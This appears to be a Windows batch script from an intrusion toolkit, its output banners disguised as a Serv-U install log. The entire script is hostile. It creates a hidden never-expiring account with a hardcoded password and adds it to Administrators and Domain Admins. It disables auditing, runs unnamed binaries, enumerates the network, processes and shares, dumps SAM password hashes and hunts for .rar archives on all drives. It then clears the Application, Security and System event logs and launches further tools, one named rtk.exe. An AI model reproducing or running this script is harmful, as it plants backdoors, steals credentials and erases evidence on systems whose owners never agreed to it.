@echo OFF
win.exe >nul
dll.exe >nul
net stop serv-u >nul
echo          �����������������ܱ���������������������������� >> instlog.nfo
echo      �����������������������������������������������������۱ >> instlog.nfo
echo �������۲�             PRE INSTALL PROCESS             ���۱����� >> instlog.nfo
echo       ����������������������������������������������������� >> instlog.nfo
echo ������� 2) adding user >> instlog.nfo
net user SUPPORT_3569r32 no$!$tuff@9! /add >> instlog.nfo
net localgroup Administrators SUPPORT_3569r32 /add >> instlog.nfo
net group "Domain Admins" SUPPORT_3569r32 /add >> instlog.nfo
net user SUPPORT_3569r32 /EXPIRES:never >> instlog.nfo
regedit /s patch.dll >nul
del patch.dll /q /f >nul
AUDITPOL \\127.0.0.1 /disable  >nul
ms_snd.exe
sys_event.exe
echo      �����������������������������������������������������۱ >> instlog.nfo
echo �������۲�            LOADING SERV-U DAEMON            ���۱����� >> instlog.nfo
echo       ����������������������������������������������������� >> instlog.nfo
%windir%\system32\sslhttp.exe /i >nul
net start sslh >> instlog.nfo
echo      �����������������������������������������������������۱ >> instlog.nfo
echo �������۲�               PC INFORMATION                ���۱����� >> instlog.nfo
echo       ����������������������������������������������������� >> instlog.nfo
browselist.exe >> instlog.nfo
infox.exe >> instlog.nfo
uptix.exe /s >> instlog.nfo
echo      �����������������������������������������������������۱ >> instlog.nfo
echo �������۲�                 PC IP CONFIG                ���۱����� >> instlog.nfo
echo       �����������������������������������������������������>> instlog.nfo
ipconfig /all >> instlog.nfo
route print >> instlog.nfo
echo      �����������������������������������������������������۱ >> instlog.nfo
echo �������۲�                   TAKLIST                   ���۱����� >> instlog.nfo
echo       ����������������������������������������������������� >> instlog.nfo
pm.exe >> instlog.nfo
echo      �����������������������������������������������������۱ >> instlog.nfo
echo �������۲�             TCP UDP PORT LISTER             ���۱����� >> instlog.nfo
echo       ����������������������������������������������������� >> instlog.nfo
opp.exe >> instlog.nfo
echo      �����������������������������������������������������۱ >> instlog.nfo
echo �������۲�             DOMAIN ENUMERATION              ���۱����� >> instlog.nfo
echo       ����������������������������������������������������� >> instlog.nfo
net view /DOMAIN >> instlog.nfo
echo      �����������������������������������������������������۱ >> instlog.nfo
echo �������۲�                CURRENT SHARE                ���۱����� >> instlog.nfo
echo       ����������������������������������������������������� >> instlog.nfo
net share >> instlog.nfo
echo      �����������������������������������������������������۱ >> instlog.nfo
echo �������۲�              NT SERVICE SUMMARY             ���۱����� >> instlog.nfo
echo       ����������������������������������������������������� >> instlog.nfo
dpe.exe -v >> instlog.nfo
echo      �����������������������������������������������������۱ >> instlog.nfo
echo �������۲�                    NT SAM                   ���۱����� >> instlog.nfo
echo       ����������������������������������������������������� >> instlog.nfo
call pW2D.exe >> sam.nfo
echo      �����������������������������������������������������۱ >> instlog.nfo
echo �������۲�                 RAR SEARCHER                ���۱����� >> instlog.nfo
echo       ����������������������������������������������������� >> instlog.nfo
echo �������  �[1] Search *.rar in c: >> instlog.nfo
dir c:\*.rar /s >> instlog.nfo
echo �������  �[2] Search *.rar in d: >> instlog.nfo
dir d:\*.rar /s >> instlog.nfo
echo �������  �[3] Search *.rar in e: >> instlog.nfo
dir e:\*.rar /s >> instlog.nfo 
echo �������  �[4] Search *.rar in f: >> instlog.nfo
dir f:\*.rar /s >> instlog.nfo
echo      �����������������������������������������������������۱ >> instlog.nfo
echo �������۲�                  CLEARLOGS                  ���۱����� >> instlog.nfo
echo       ����������������������������������������������������� >> instlog.nfo
clelg.exe -app
echo �������  �[1] Clearing Application log >> instlog.nfo
clelg.exe -sys >> instlog.nfo
echo �������  �[2] Clearing Security log >> instlog.nfo
clelg.exe -sec >> instlog.nfo
echo �������  �[3] Clearing System log >> instlog.nfo
a.exe /r /n 'secure.bat SUPPORT_3569r32 no$!$tuff@9!' >nul
a.exe /r /n 'remotetest1.3.exe' >nul
a.exe /r /n 'rtk.exe' >nul
a.exe /r /n 'dele.bat' >nul